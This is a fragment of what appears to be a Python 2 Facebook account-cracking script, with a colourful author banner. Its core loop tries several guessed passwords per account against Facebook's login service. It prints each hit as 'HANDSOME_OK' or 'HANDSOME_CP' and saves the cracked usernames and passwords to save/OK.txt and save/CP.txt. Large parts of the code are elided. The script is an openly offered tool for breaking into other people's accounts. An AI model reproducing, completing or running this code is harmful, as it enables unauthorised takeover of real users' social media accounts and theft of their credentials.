...
\033[94;1m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝ 
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  MR-HANDSOME-OFFICIAL 
\033[1;91m GitHub      : https://github.com/Handsome 
\033[1;91m LOVER🙈    :  HANDSOME EX HASEENA
\033[1;91m FACEBOOK     :  Mr Handsome 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [HANDSOME_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [HANDSOME_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [HANDSOME_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [HANDSOME_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [HANDSOME_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [HANDSOME_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
